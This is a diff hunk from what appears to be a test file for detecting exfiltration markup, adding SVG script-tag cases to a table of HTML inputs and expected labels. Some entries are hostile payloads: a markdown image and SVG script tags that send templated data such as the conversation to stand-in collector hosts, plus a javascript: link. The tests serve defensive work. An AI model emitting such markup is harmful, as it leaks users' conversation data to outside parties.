@@ -671,6 +671,9 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             [],
         ),
         ("<a href='java script:alert(1)'>x</a>", []),
+        ("<svg><script type='application/json' href='https://collector.test/{c}.json'/></svg>", []),
+        ("<svg><script type='text/ecmascript' href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
+        ("<svg><script language='vbscript' href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
         (
             (
                 "<div><template shadowrootmode='open'></div><base href='https://safe.test/'></template>"
